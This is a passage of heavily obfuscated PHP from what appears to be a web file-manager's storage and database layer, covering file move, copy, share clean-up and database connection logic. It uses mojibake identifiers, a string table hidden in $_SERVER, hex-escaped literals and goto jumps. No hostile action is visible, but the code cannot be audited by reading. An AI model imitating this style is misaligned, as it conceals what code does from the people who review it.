{ return !1; } Hook::trigger($¥ì”î™í[663], $Âû•Üì); $this->targetIsDelete = intval($œ³ˆì[$¥ì”î™í[507]]); if ($œ³ˆì[$¥ì”î™í[192]] == $èÊ…‡Ø¢ && $ËÃ×…Ò != $œ³ˆì[$¥ì”î™í[32]]) { $äş™±Å­ = $this->fileNameExist($èÊ…‡Ø¢, $ËÃ×…Ò); if ($äş™±Å­ && $œ³ˆì[$¥ì”î™í[487]] == $¥ì”î™í[230]) { $«ÇÈØÑ = $this->sourceInfo($äş™±Å­); $İÚŒ‘Ğ = $this->fileHistory($«ÇÈØÑ, $œ³ˆì[$¥ì”î™í[543]], $œ³ˆì[$¥ì”î™í[79]]); if (!$İÚŒ‘Ğ) { Model($¥ì”î™í[546])->remove($œ³ˆì[$¥ì”î™í[543]]); } $this->removeNow($³œİÅ, !1); $this->folderSizeReset($èÊ…‡Ø¢); Hook::trigger($¥ì”î™í[664], $Âû•Üì); return $äş™±Å­; } } $Ô°åºø¦ = $ËÃ×…Ò ? $ËÃ×…Ò : $œ³ˆì[$¥ì”î™í[32]]; $this->lockMoveStart($³œİÅ); $this->lockWriteStart($èÊ…‡Ø¢, $Ô°åºø¦); $°À“ãİº = array($¥ì”î™í[634] => array(), $¥ì”î™í[665] => !1); $this->clearShare($³œİÅ, $èÊ…‡Ø¢); $ÉãŸ·ÒØ = $this->fileNameExistAuto($èÊ…‡Ø¢, $œ³ˆì); $ºãâÄòı = $this->_move($³œİÅ, $èÊ…‡Ø¢, $Âœë¾¶¬, $°À“ãİº, $ËÃ×…Ò); $this->sourceCacheClear(); if ($œ³ˆì[$¥ì”î™í[487]] == $¥ì”î™í[91] && $ÉãŸ·ÒØ) { $this->folderSizeResetChildren($ºãâÄòı); } Model($¥ì”î™í[232])->linkAdd($°À“ãİº[$¥ì”î™í[634]]); if ($ºãâÄòı && $ÉãŸ·ÒØ && $°À“ãİº[$¥ì”î™í[665]]) { $á—ñŒ = $œ³ˆì[$¥ì”î™í[487]] == $¥ì”î™í[91] ? $this->_childrenListSelect($³œİÅ) : !1; $æ¿²¾–¬ = $á—ñŒ && count($á—ñŒ) > 0 ? !0 : !1; $this->removeNow($³œİÅ, $æ¿²¾–¬); } $this->lockMoveEnd($³œİÅ); $this->lockWriteEnd($èÊ…‡Ø¢, $Ô°åºø¦); $this->folderSizeReset($œ³ˆì[$¥ì”î™í[192]]); $this->folderSizeReset($èÊ…‡Ø¢); $Ì´Ñ«ÏÂ = array($œ³ˆì[$¥ì”î™í[192]], $èÊ…‡Ø¢); if ($œ³ˆì[$¥ì”î™í[487]] == $¥ì”î™í[91]) { $Ì´Ñ«ÏÂ[] = $³œİÅ; } $this->updateModifyTime($Ì´Ñ«ÏÂ); Model($¥ì”î™í[638])->eventMove($³œİÅ, $œ³ˆì[$¥ì”î™í[192]], $èÊ…‡Ø¢); Hook::trigger($¥ì”î™í[664], $Âû•Üì); return $ºãâÄòı; } private function _move($ÂÚ³Œè™, $Ë“‚³÷, $íãÙÃã‹, &$Î§à±µ…, $÷òÕÙŸ± = '') { $É¸éŒƒÑ =& $_SERVER[ÔÕ±ĞšÎ]; $Ÿ¾ÚšŠ¥ = $this->sourceInfo($ÂÚ³Œè™); $áĞàöóÓ = $Ÿ¾ÚšŠ¥[$É¸éŒƒÑ[487]] == $É¸éŒƒÑ[91]; $ù¸æËß = $÷òÕÙŸ± ? $÷òÕÙŸ± : $Ÿ¾ÚšŠ¥[$É¸éŒƒÑ[32]]; $ì©Üı™ì = $this->fileNameExistAuto($Ë“‚³÷, $Ÿ¾ÚšŠ¥); $this->lockMoveStart($ÂÚ³Œè™); $this->lockWriteStart($Ë“‚³÷, $ù¸æËß); if (!$ì©Üı™ì) { return $this->_moveForce($ÂÚ³Œè™, $Ë“‚³÷, $ù¸æËß); } $”Û…ÙÏ‹ = $ì©Üı™ì; $‚”ªÙï€ = !1; if ($áĞàöóÓ) { if ($íãÙÃã‹ == REPEAT_RENAME_FOLDER) { $ù¸æËß = $this->fileNameAuto($Ë“‚³÷, $ù¸æËß, $íãÙÃã‹, $áĞàöóÓ); $”Û…ÙÏ‹ = $this->_moveForce($ÂÚ³Œè™, $Ë“‚³÷, $ù¸æËß); } else { $Û’ú°Ó = $this->_childrenListSelect($ÂÚ³Œè™); foreach ($Û’ú°Ó as $î¨æ¿Ôí) { $é¨Æ§š÷ = REPEAT_REPLACE; $this->_move($î¨æ¿Ôí[$É¸éŒƒÑ[193]], $ì©Üı™ì, $é¨Æ§š÷, $Î§à±µ…); } $‚”ªÙï€ = !0; } } else { if ($íãÙÃã‹ == REPEAT_RENAME || $íãÙÃã‹ == REPEAT_RENAME_FOLDER) { $ù¸æËß = $this->fileNameAuto($Ë“‚³÷, $ù¸æËß, $íãÙÃã‹, $áĞàöóÓ); $”Û…ÙÏ‹ = $this->_moveForce($ÂÚ³Œè™, $Ë“‚³÷, $ù¸æËß); } else { $ÈÊíÈ = $this->sourceInfoCache($ì©Üı™ì); $Ğôêò§£ = $this->fileHistory($ÈÊíÈ, $Ÿ¾ÚšŠ¥[$É¸éŒƒÑ[543]], $Ÿ¾ÚšŠ¥[$É¸éŒƒÑ[79]]); if ($Ğôêò§£) { $Î§à±µ…[$É¸éŒƒÑ[634]][] = $Ÿ¾ÚšŠ¥[$É¸éŒƒÑ[543]]; } $‚”ªÙï€ = !0; } } if ($‚”ªÙï€) { $Î§à±µ…[$É¸éŒƒÑ[665]] = !0; } return $”Û…ÙÏ‹; } private function _moveForce($ù¿úÅŒÏ, $Û…Œ° , $í›¿ Ã‘) { $Ê°Å›†¤ =& $_SERVER[ÔÕ±ĞšÎ]; $Ÿ´¹ó›“ = $this->sourceInfo($ù¿úÅŒÏ); $’ôà†ä = $this->sourceInfo($Û…Œ° ); $Öêê¸üÒ = $Ÿ´¹ó›“[$Ê°Å›†¤[487]] == $Ê°Å›†¤[91]; $ëÈ•¤‹¯ = array($Ê°Å›†¤[479] => $’ôà†ä[$Ê°Å›†¤[193]], $Ê°Å›†¤[657] => $’ôà†ä[$Ê°Å›†¤[586]] . $’ôà†ä[$Ê°Å›†¤[193]] . $Ê°Å›†¤[50], $Ê°Å›†¤[653] => $’ôà†ä[$Ê°Å›†¤[190]], $Ê°Å›†¤[654] => $’ôà†ä[$Ê°Å›†¤[571]], $Ê°Å›†¤[656] => USER_ID, $Ê°Å›†¤[496] => $í›¿ Ã‘); $Ìïéü§ = $Ÿ´¹ó›“[$Ê°Å›†¤[190]] == SourceModel::TYPE_GROUP && $’ôà†ä[$Ê°Å›†¤[190]] == SourceModel::TYPE_GROUP && $Ÿ´¹ó›“[$Ê°Å›†¤[571]] == $’ôà†ä[$Ê°Å›†¤[571]]; if (!$Ìïéü§ && $this->moveClearAuth) { Model($Ê°Å›†¤[569])->authClear($ù¿úÅŒÏ); } $‹¼âÖù = $Ÿ´¹ó›“[$Ê°Å›†¤[507]] == $Ê°Å›†¤[91] && $’ôà†ä[$Ê°Å›†¤[507]] != $Ê°Å›†¤[91]; if ($‹¼âÖù) { $ëÈ•¤‹¯[$Ê°Å›†¤[506]] = 0; } if ($Öêê¸üÒ) { $Ç™£õÃÈ = array($Ê°Å›†¤[657] => array($Ê°Å›†¤[617], $Ÿ´¹ó›“[$Ê°Å›†¤[586]] . $Ÿ´¹ó›“[$Ê°Å›†¤[193]] . $Ê°Å›†¤[618])); $©¶şŒ£Ã = $Ÿ´¹ó›“[$Ê°Å›†¤[586]] . $Ÿ´¹ó›“[$Ê°Å›†¤[193]] . $Ê°Å›†¤[50]; $©ÂĞŠ± = $’ôà†ä[$Ê°Å›†¤[586]] . $’ôà†ä[$Ê°Å›†¤[193]] . $Ê°Å›†¤[50] . $Ÿ´¹ó›“[$Ê°Å›†¤[193]] . $Ê°Å›†¤[50]; $˜¥£Ä€„ = array($Ê°Å›†¤[657] => array($Ê°Å›†¤[666], "\x72\x65\160\154\x61\143\x65\x28\160\141\x72\145\156\164\114\x65\166\x65\154\x2c\x27{$©¶şŒ£Ã}\x27\x2c\47{$©ÂĞŠ±}\47\51"), $Ê°Å›†¤[653] => $’ôà†ä[$Ê°Å›†¤[190]], $Ê°Å›†¤[654] => $’ôà†ä[$Ê°Å›†¤[571]]); if ($‹¼âÖù) { $˜¥£Ä€„[$Ê°Å›†¤[506]] = 0; } $this->where($Ç™£õÃÈ)->data($˜¥£Ä€„)->save(); } $this->where(array($Ê°Å›†¤[493] => $ù¿úÅŒÏ))->data($ëÈ•¤‹¯)->save(); return $ù¿úÅŒÏ; } private function clearShare($ğí”¢½, $ŒÙ˜Ì“) { $ş—íÖŸ =& $_SERVER[ÔÕ±ĞšÎ]; $åùÓÒÁı = $this->sourceInfo($ğí”¢½); $î³¥ºìÂ = $this->sourceInfo($ŒÙ˜Ì“); if ($åùÓÒÁı[$ş—íÖŸ[571]] == $î³¥ºìÂ[$ş—íÖŸ[571]] && $åùÓÒÁı[$ş—íÖŸ[190]] == $ş—íÖŸ[667]) { return; } $»Éšùœƒ = array($ş—íÖŸ[586] => array($ş—íÖŸ[617], $åùÓÒÁı[$ş—íÖŸ[586]] . $ğí”¢½ . $ş—íÖŸ[618])); $Æ‡¡íŸ = $this->field($ş—íÖŸ[493])->where($»Éšùœƒ)->getField($ş—íÖŸ[193], !0); if (!$Æ‡¡íŸ) { return; } $»Éšùœƒ = array($ş—íÖŸ[193] => array($ş—íÖŸ[7], $Æ‡¡íŸ), $ş—íÖŸ[668] => 1); $›§šç„œ = Model($ş—íÖŸ[669])->field($ş—íÖŸ[670])->where($»Éšùœƒ)->select(); if (!$›§šç„œ) { return; } $›§šç„œ = array_to_keyvalue($›§šç„œ, $ş—íÖŸ[12], $ş—íÖŸ[670]); $»Éšùœƒ = array($ş—íÖŸ[670] => array($ş—íÖŸ[7], $›§šç„œ)); Model($ş—íÖŸ[669])->where($»Éšùœƒ)->save(array($ş—íÖŸ[668] => 0)); Model($ş—íÖŸ[671])->where($»Éšùœƒ)->delete(); } public function copyFolderFromIO($Ñ±«Ÿíù, $’éğ„õç, $ÕÁ¿Ş“†, $ØÁ´şˆî, $Ó¸€¾¢ , $É®§ë’• = false) { $í¨ÒøÊÇ =& $_SERVER[ÔÕ±ĞšÎ]; $±µüˆ×Ş = array($í¨ÒøÊÇ[635] => array(), $í¨ÒøÊÇ[636] => array(), $í¨ÒøÊÇ[634] => array(), $í¨ÒøÊÇ[672] => array()); $¿ßÄíƒ” = $É®§ë’• ? $É®§ë’• : $Ñ±«Ÿíù->pathThis($’éğ„õç); $°ë˜õ¢Ë = $this->fileNameExist($ÕÁ¿Ş“†, $¿ßÄíƒ”); $ı„À«à = $this->mkdir($ÕÁ¿Ş“†, $¿ßÄíƒ”, $ØÁ´şˆî); if (!$°ë˜õ¢Ë || $ØÁ´şˆî == REPEAT_RENAME_FOLDER) { $ØÁ´şˆî = !1; } if ($°ë˜õ¢Ë) { $this->_childrenAllMake($°ë˜õ¢Ë); } Hook::trigger($í¨ÒøÊÇ[673]); $this->_copyChildTo($Ñ±«Ÿíù, $’éğ„õç, $ı„À«à, $ØÁ´şˆî, $±µüˆ×Ş, $Ó¸€¾¢ ); Hook::trigger($í¨ÒøÊÇ[674]); if ($ı„À«à) { $this->folderSizeResetChildren($ı„À«à); } $this->_childrenListClear(); Model($í¨ÒøÊÇ[637])->addAll($±µüˆ×Ş[$í¨ÒøÊÇ[635]], array(), !0); Model($í¨ÒøÊÇ[638])->eventCopy($ı„À«à); $this->saveAll($±µüˆ×Ş[$í¨ÒøÊÇ[636]]); Model($í¨ÒøÊÇ[546])->linkAdd($±µüˆ×Ş[$í¨ÒøÊÇ[634]]); Model($í¨ÒøÊÇ[546])->remove($±µüˆ×Ş[$í¨ÒøÊÇ[672]]); $this->folderSizeReset($ÕÁ¿Ş“†); $this->updateModifyTime($ÕÁ¿Ş“†); return $ı„À«à; } private function _copyChildTo($·‡˜ÄõÍ, $÷³ÄØÃò, $Ôş ÒÒ™, $Õ‰ı‚, &$Ùš¡ƒè”, $ç¿£Ààö) { $Ó€ ã¸æ =& $_SERVER[ÔÕ±ĞšÎ]; $ÇÚ‚ïñ— = $this->sourceInfoCache($Ôş ÒÒ™); $üõ©ßç = $·‡˜ÄõÍ->listPath($÷³ÄØÃò); $üõ©ßç = $üõ©ßç ? $üõ©ßç : array($Ó€ ã¸æ[86] => array(), $Ó€ ã¸æ[85] => array()); $Â¬‰¾¶ = array_merge($üõ©ßç[$Ó€ ã¸æ[86]], $üõ©ßç[$Ó€ ã¸æ[85]]); $´êî™‘¢ = $this->_addFiles($·‡˜ÄõÍ, $üõ©ßç[$Ó€ ã¸æ[86]], $ç¿£Ààö); $ÃÜûÎå = array(); foreach ($Â¬‰¾¶ as &$ÒµÏ²Åİ) { if (isset($´êî™‘¢[$ÒµÏ²Åİ[$Ó€ ã¸æ[32]]])) { $ÒµÏ²Åİ = $´êî™‘¢[$ÒµÏ²Åİ[$Ó€ ã¸æ[32]]]; } $ÒµÏ²Åİ[$Ó€ ã¸æ[487]] = $ÒµÏ²Åİ[$Ó€ ã¸æ[33]] == $Ó€ ã¸æ[78]; $ÒµÏ²Åİ[$Ó€ ã¸æ[488]] = substr(_get($ÒµÏ²Åİ, $Ó€ ã¸æ[169], $Ó€ ã¸æ[12]), 0, 10); $ÒµÏ²Åİ[$Ó€ ã¸æ[79]] = _get($ÒµÏ²Åİ, $Ó€ ã¸æ[79], 0); $ÒµÏ²Åİ[$Ó€ ã¸æ[543]] = _get($ÒµÏ²Åİ, $Ó€ ã¸æ[543], 0); if (!isset($ÒµÏ²Åİ[$Ó€ ã¸æ[675]]) && $ÒµÏ²Åİ[$Ó€ ã¸æ[543]]) { $Ùš¡ƒè”[$Ó€ ã¸æ[672]][] = $ÒµÏ²Åİ[$Ó€ ã¸æ[543]]; } if ($Õ‰ı‚) { $¨×›¹÷ = $this->fileNameExistCache($Ôş ÒÒ™, $ÒµÏ²Åİ[$Ó€ ã¸æ[32]]); if ($¨×›¹÷) { if ($ÒµÏ²Åİ[$Ó€ ã¸æ[487]] || $Õ‰ı‚ == REPEAT_SKIP) { continue; } if ($Õ‰ı‚ == REPEAT_REPLACE) { $ãíüŞë« = $this->sourceInfoCache($¨×›¹÷); $‹ °÷Š® = $this->fileHistory($ãíüŞë«, $ÒµÏ²Åİ[$Ó€ ã¸æ[543]], $ÒµÏ²Åİ[$Ó€ ã¸æ[79]]); if ($‹ °÷Š®) { $Ùš¡ƒè”[$Ó€ ã¸æ[634]][] = $ÒµÏ²Åİ[$Ó€ ã¸æ[543]]; } continue; } else { if ($Õ‰ı‚ == REPEAT_RENAME) { $ÒµÏ²Åİ[$Ó€ ã¸æ[32]] = $this->fileNameAutoCache($Ôş ÒÒ™, $ÒµÏ²Åİ[$Ó€ ã¸æ[32]], $Õ‰ı‚, !1); } } } } if (!$ÒµÏ²Åİ[$Ó€ ã¸æ[487]] && $ÒµÏ²Åİ[$Ó€ ã¸æ[543]] == 0) { continue; } if (!$ÒµÏ²Åİ[$Ó€ ã¸æ[487]] && $ÒµÏ²Åİ[$Ó€ ã¸æ[543]]) { $Ùš¡ƒè”[$Ó€ ã¸æ[634]][] = $ÒµÏ²Åİ[$Ó€ ã¸æ[543]]; } $ÃÜûÎå[] = $this->_makeItemData($ÒµÏ²Åİ, $ÇÚ‚ïñ—, $ÒµÏ²Åİ[$Ó€ ã¸æ[32]]); } unset($ÒµÏ²Åİ); if (!empty($ÃÜûÎå)) { $this->addAll($ÃÜûÎå); $this->_childrenListSelect($Ôş ÒÒ™); } $Äóüã‘® = $this->_childrenList($Ôş ÒÒ™); $Äóüã‘® = array_to_keyvalue($Äóüã‘®, $Ó€ ã¸æ[32]); foreach ($Â¬‰¾¶ as $ÒµÏ²Åİ) { $ãíüŞë« = $Äóüã‘®[$ÒµÏ²Åİ[$Ó€ ã¸æ[32]]]; $¢¢Åª• = $ãíüŞë«[$Ó€ ã¸æ[193]]; $this->_copyApplyMeta($ãíüŞë«, $Ùš¡ƒè”); if ($ÒµÏ²Åİ[$Ó€ ã¸æ[33]] == $Ó€ ã¸æ[78]) { $ÒµÏ²Åİ[$Ó€ ã¸æ[87]] = $·‡˜ÄõÍ->getPathInner($ÒµÏ²Åİ[$Ó€ ã¸æ[87]]); $this->_copyChildTo($·‡˜ÄõÍ, $ÒµÏ²Åİ[$Ó€ ã¸æ[87]], $¢¢Åª•, $Õ‰ı‚, $Ùš¡ƒè”, $ç¿£Ààö); } } } private function _addFiles($¢¶õÓ«Ğ, $²ú‡ , $…ÑšÏÃÀ) { $ƒ½Êğë =& $_SERVER[ÔÕ±ĞšÎ]; if (!$²ú‡  || count($²ú‡ ) == 0) { return array(); } $öëà¤ = array(); foreach ($²ú‡  as &$øß”é×¯) { Hook::trigger($ƒ½Êğë[676], $øß”é×¯); $øß”é×¯[$ƒ½Êğë[87]] = $¢¶õÓ«Ğ->getPathInner($øß”é×¯[$ƒ½Êğë[87]]); $Ä¥Ó’­ = $¢¶õÓ«Ğ->hashSimple($øß”é×¯[$ƒ½Êğë[87]]); $œËŸÀş = $¢¶õÓ«Ğ->hashMd5($øß”é×¯[$ƒ½Êğë[87]]); if (strlen($œËŸÀş) > 10 && !isset($öëà¤[$œËŸÀş])) { $öëà¤[$œËŸÀş] = array(); } $øß”é×¯[$ƒ½Êğë[677]] = $Ä¥Ó’­; $øß”é×¯[$ƒ½Êğë[549]] = $œËŸÀş; $öëà¤[$œËŸÀş][] =& $øß”é×¯; if (count($öëà¤[$œËŸÀş]) > 1) { $øß”é×¯[$ƒ½Êğë[675]] = !0; } Hook::trigger($ƒ½Êğë[678], $øß”é×¯); } unset($øß”é×¯); $ìÎµóÛ¨ = array($ƒ½Êğë[549] => array($ƒ½Êğë[7], array_keys($öëà¤))); $¸”êñ° = Model($ƒ½Êğë[679]); $Úí‚şòò = $¸”êñ°->where($ìÎµóÛ¨)->select(); $Úí‚şòò = $Úí‚şòò ? $Úí‚şòò : array(); foreach ($Úí‚şòò as $šşñ¤ìŸ) { if (!isset($öëà¤[$šşñ¤ìŸ[$ƒ½Êğë[549]]])) { continue; } $Õ½ÉÏì¦ = $öëà¤[$šşñ¤ìŸ[$ƒ½Êğë[549]]]; foreach ($Õ½ÉÏì¦ as &$øß”é×¯) { $øß”é×¯[$ƒ½Êğë[543]] = $šşñ¤ìŸ[$ƒ½Êğë[543]]; $øß”é×¯[$ƒ½Êğë[675]] = !0; } unset($øß”é×¯); } $‡«ÕäîÔ = array(); foreach ($²ú‡  as $óØÔùÅ…) { Hook::trigger($ƒ½Êğë[680], $óØÔùÅ…); if (isset($óØÔùÅ…[$ƒ½Êğë[675]]) && $óØÔùÅ…[$ƒ½Êğë[675]]) { Hook::trigger($ƒ½Êğë[681], $óØÔùÅ…); continue; } $ª‰úûú… = $¢¶õÓ«Ğ->getPathInner($óØÔùÅ…[$ƒ½Êğë[87]]); $ä»Ó—Œ = $¸”êñ°->addFileMake($ª‰úûú…, $óØÔùÅ…[$ƒ½Êğë[79]], $óØÔùÅ…[$ƒ½Êğë[677]], $óØÔùÅ…[$ƒ½Êğë[549]], $óØÔùÅ…[$ƒ½Êğë[32]], $…ÑšÏÃÀ); Hook::trigger($ƒ½Êğë[681], $óØÔùÅ…); if (!is_array($ä»Ó—Œ)) { continue; } $‡«ÕäîÔ[] = $ä»Ó—Œ; } $¸”êñ°->addAll($‡«ÕäîÔ); $ìÎµóÛ¨ = array($ƒ½Êğë[549] => array($ƒ½Êğë[7], array_keys($öëà¤))); $Úí‚şòò = $¸”êñ°->where($ìÎµóÛ¨)->select(); $Úí‚şòò = $Úí‚şòò ? $Úí‚şòò : array(); foreach ($Úí‚şòò as $šşñ¤ìŸ) { if (!isset($öëà¤[$šşñ¤ìŸ[$ƒ½Êğë[549]]])) { continue; } $à§¹à¯ =& $öëà¤[$šşñ¤ìŸ[$ƒ½Êğë[549]]]; foreach ($à§¹à¯ as &$øß”é×¯) { $øß”é×¯[$ƒ½Êğë[543]] = $šşñ¤ìŸ[$ƒ½Êğë[543]]; } unset($øß”é×¯); } $ºû„æ = array(); foreach ($²ú‡  as $»ö¥‹Â…) { $ºû„æ[$»ö¥‹Â…[$ƒ½Êğë[32]]] = $»ö¥‹Â…; } return $ºû„æ; } } define($_SERVER[ÔÕ±ĞšÎ][682], $_SERVER[ÔÕ±ĞšÎ][683]); $saqjntdmhu = $_SERVER[ÔÕ±ĞšÎ][684]; goto c‰ÔÚø”›; bÂ³¤ë«õî: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\x65\x71" => "\74\x3e", "\x67\x74" => "\76", "\145\147\164" => "\76\75", "\154\x74" => "\x3c", "\x65\154\x74" => "\74\75", "\156\x6f\164\x6c\151\153\x65" => "\116\117\124\x20\x4c\x49\113\105", "\x6c\x69\153\145" => "\114\111\113\x45", "\x69\x6e" => "\111\116", "\x6e\157\164\151\x6e" => "\116\x4f\124\x20\111\x4e", "\x6e\x6f\164\x20\151\x6e" => "\116\x4f\124\x20\x49\116", "\142\x65\x74\167\145\x65\156" => "\x42\x45\x54\x57\105\x45\116", "\156\x6f\164\x62\145\x74\167\145\x65\156" => "\x4e\x4f\x54\40\102\x45\124\x57\x45\105\x4e", "\156\x6f\x74\x20\x62\145\164\167\x65\145\x6e" => "\x4e\117\x54\x20\102\105\x54\x57\105\105\116"); protected $selectSql = "\x53\x45\114\x45\x43\124\45\104\x49\123\x54\x49\x4e\103\124\45\40\x25\x46\111\105\x4c\x44\45\40\106\x52\117\115\40\45\x54\x41\x42\114\x45\x25\x25\x4a\x4f\111\x4e\45\x25\127\x48\105\x52\105\45\45\107\122\x4f\x55\120\45\45\110\101\x56\111\x4e\x47\x25\x25\x4f\x52\x44\105\x52\x25\45\114\x49\115\111\x54\45\x20\45\125\116\111\117\116\x25\x25\x43\x4f\115\115\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $¡“Â³—Ì = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÔÕ±ĞšÎ][1039], $¡“Â³—Ì); } public function factory($„à´åóË = '') { $š…‚Ñ¥á =& $_SERVER[ÔÕ±ĞšÎ]; $„à´åóË = $this->parseConfig($„à´åóË); if (empty($„à´åóË[$š…‚Ñ¥á[1040]])) { think_exception(think_lang($š…‚Ñ¥á[1041])); } $this->dbType = ucwords(strtolower($„à´åóË[$š…‚Ñ¥á[1040]])); $Ì©ò§åû = $š…‚Ñ¥á[1042] . $this->dbType; if (class_exists($Ì©ò§åû)) { $‡èÉø§ = new $Ì©ò§åû($„à´åóË); if ($š…‚Ñ¥á[1043] != strtolower($„à´åóË[$š…‚Ñ¥á[1040]])) { $‡èÉø§->dbType = strtoupper($this->dbType); } else { $‡èÉø§->dbType = $this->_getDsnType($„à´åóË[$š…‚Ñ¥á[995]]); } } else { think_exception(think_lang($š…‚Ñ¥á[1044]) . $š…‚Ñ¥á[1045] . $Ì©ò§åû); } return $‡èÉø§; } public function __call($ÄÕ’ÎûÂ, $ûîÃîÙ®) { if (method_exists($this, $ÄÕ’ÎûÂ)) { return call_user_func_array(array($this, $ÄÕ’ÎûÂ), $ûîÃîÙ®); } } protected function _getDsnType($€Û®‡Ï ) { $§ŞÜÂèê = explode($_SERVER[ÔÕ±ĞšÎ][4], $€Û®‡Ï ); $·¬©õØÚ = strtoupper(trim($§ŞÜÂèê[0])); return $·¬©õØÚ; } private function parseConfig($İ°”ãşç = '') { $ˆ¥Ñ†¨Ø =& $_SERVER[ÔÕ±ĞšÎ]; if (!empty($İ°”ãşç) && is_string($İ°”ãşç)) { $İ°”ãşç = $this->parseDSN($İ°”ãşç); } elseif (is_array($İ°”ãşç)) { $İ°”ãşç = array_change_key_case($İ°”ãşç); $İ°”ãşç = array($ˆ¥Ñ†¨Ø[1040] => $İ°”ãşç[$ˆ¥Ñ†¨Ø[1046]], $ˆ¥Ñ†¨Ø[967] => $İ°”ãşç[$ˆ¥Ñ†¨Ø[1047]], $ˆ¥Ñ†¨Ø[968] => $İ°”ãşç[$ˆ¥Ñ†¨Ø[1048]], $ˆ¥Ñ†¨Ø[965] => $İ°”ãşç[$ˆ¥Ñ†¨Ø[1049]], $ˆ¥Ñ†¨Ø[966] => $İ°”ãşç[$ˆ¥Ñ†¨Ø[1050]], $ˆ¥Ñ†¨Ø[21] => $İ°”ãşç[$ˆ¥Ñ†¨Ø[1051]], $ˆ¥Ñ†¨Ø[995] => $İ°”ãşç[$ˆ¥Ñ†¨Ø[1052]], $ˆ¥Ñ†¨Ø[17] => isset($İ°”ãşç[$ˆ¥Ñ†¨Ø[1053]]) ? $İ°”ãşç[$ˆ¥Ñ†¨Ø[1053]] : array()); } elseif (empty($İ°”ãşç)) { if (think_config($ˆ¥Ñ†¨Ø[1054]) && $ˆ¥Ñ†¨Ø[1043] != strtolower(think_config($ˆ¥Ñ†¨Ø[1055]))) { $İ°”ãşç = $this->parseDSN(think_config($ˆ¥Ñ†¨Ø[1054])); } else { $İ°”ãşç = array($ˆ¥Ñ†¨Ø[1040] => think_config($ˆ¥Ñ†¨Ø[1055]), $ˆ¥Ñ†¨Ø[967] => think_config($ˆ¥Ñ†¨Ø[1056]), $ˆ¥Ñ†¨Ø[968] => think_config($ˆ¥Ñ†¨Ø[1057]), $ˆ¥Ñ†¨Ø[965] => think_config($ˆ¥Ñ†¨Ø[1058]), $ˆ¥Ñ†¨Ø[966] => think_config($ˆ¥Ñ†¨Ø[1059]), $ˆ¥Ñ†¨Ø[21] => think_config($ˆ¥Ñ†¨Ø[325]), $ˆ¥Ñ†¨Ø[995] => think_config($ˆ¥Ñ†¨Ø[1054]), $ˆ¥Ñ†¨Ø[17] => think_config($ˆ¥Ñ†¨Ø[1060])); } } return $İ°”ãşç; } protected function initConnect($–Ÿ‡Ë¼ô = true) { if (1 == think_config($_SERVER[ÔÕ±ĞšÎ][22])) { $this->_linkID = $this->multiConnect($–Ÿ‡Ë¼ô); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $©˜İéÓ => $¯±­îÃÚ) { $this->_linkID = $¯±­îÃÚ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ØæùØ = false) { $±Œª°ñ§ =& $_SERVER[ÔÕ±ĞšÎ]; static $¨Í¡óæŒ = array(); static $²ßöŞË˜ = -1; if (empty($¨Í¡óæŒ)) { foreach ($this->config as $ºªÎ¿¯ => $…ïŠŒñ·) { $¨Í¡óæŒ[$ºªÎ¿¯] = explode($±Œª°ñ§[50], $…ïŠŒñ·); } } if (think_config($±Œª°ñ§[1061])) { if ($ØæùØ || think_config($±Œª°ñ§[473]) === !0) { $Ù“ò¤ = floor(mt_rand(0, think_config($±Œª°ñ§[1062]) - 1)); $²ßöŞË˜ = $Ù“ò¤; } else { if (is_numeric(think_config($±Œª°ñ§[1063]))) { $Ù“ò¤ = think_config($±Œª°ñ§[1063]); } else { $Ù“ò¤ = floor(mt_rand(think_config($±Œª°ñ§[1062]), count($¨Í¡óæŒ[$±Œª°ñ§[965]]) - 1)); } } } else { $Ù“ò¤ = floor(mt_rand(0, count($¨Í¡óæŒ[$±Œª°ñ§[965]]) - 1)); $²ßöŞË˜ = $Ù“ò¤; } $Ù“ò¤ = $²ßöŞË˜ !== -1 ? $²ßöŞË˜ : $Ù“ò¤; $¢´ù§å = array($±Œª°ñ§[967] => isset($¨Í¡óæŒ[$±Œª°ñ§[967]][$Ù“ò¤]) ? $¨Í¡óæŒ[$±Œª°ñ§[967]][$Ù“ò¤] : $¨Í¡óæŒ[$±Œª°ñ§[967]][0], $±Œª°ñ§[968] => isset($¨Í¡óæŒ[$±Œª°ñ§[968]][$Ù“ò¤]) ? $¨Í¡óæŒ[$±Œª°ñ§[968]][$Ù“ò¤] : $¨Í¡óæŒ[$±Œª°ñ§[968]][0], $±Œª°ñ§[965] => isset($¨Í¡óæŒ[$±Œª°ñ§[965]][$Ù“ò¤]) ? $¨Í¡óæŒ[$±Œª°ñ§[965]][$Ù“ò¤] : $¨Í¡óæŒ[$±Œª°ñ§[965]][0], $±Œª°ñ§[966] => isset($¨Í¡óæŒ[$±Œª°ñ§[966]][$Ù“ò¤]) ? $¨Í¡óæŒ[$±Œª°ñ§[966]][$Ù“ò¤] : $¨Í¡óæŒ[$±Œª°ñ§[966]][0], $±Œª°ñ§[21] => isset($¨Í¡óæŒ[$±Œª°ñ§[21]][$Ù“ò¤]) ? $¨Í¡óæŒ[$±Œª°ñ§[21]][$Ù“ò¤] : $¨Í¡óæŒ[$±Œª°ñ§[21]][0], $±Œª°ñ§[995] => isset($¨Í¡óæŒ[$±Œª°ñ§[995]][$Ù“ò¤]) ? $¨Í¡óæŒ[$±Œª°ñ§[995]][$Ù“ò¤] : $¨Í¡óæŒ[$±Œª°ñ§[995]][0], $±Œª°ñ§[17] => isset($¨Í¡óæŒ[$±Œª°ñ§[17]][$Ù“ò¤]) ? $¨Í¡óæŒ[$±Œª°ñ§[17]][$Ù“ò¤] : $¨Í¡óæŒ[$±Œª°ñ§[17]][0]); return $this->connect($¢´ù§å, $Ù“ò¤); } public function parseDSN($…ş¿¯î¬) { $£èšèÑš =& 